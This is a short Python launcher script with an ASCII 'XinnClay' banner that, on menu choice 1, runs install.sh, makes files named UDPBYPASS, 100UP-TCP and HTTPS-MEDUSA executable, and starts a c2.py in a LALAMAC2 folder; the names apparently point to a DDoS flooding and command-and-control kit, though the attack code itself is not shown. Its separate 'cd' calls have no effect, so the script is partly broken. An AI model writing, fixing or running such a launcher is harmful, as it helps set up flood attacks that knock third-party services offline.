import os
print("""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
""")

print("""\33[0;32m[1] RUN\n[2] CANCEL\nWhich one do you use?""")

c = input(">>>: ")
if c == "1":
    os.system("bash install.sh")
    os.system("cd")
    os.system("cd LALAMAC2")
    os.system("chmod +x UDPBYPASS")
    os.system("chmod +x 100UP-TCP")
    os.system("chmod +x HTTPS-MEDUSA")
    os.system("chmod +x *")
    os.system("cd")
    os.system("cd LALAMAC2")
    os.system("python3 c2.py")

elif c == "2":
    os.system("clear")

print("\33[0;32m[ √ ] S U C C E S S F U L L Y")
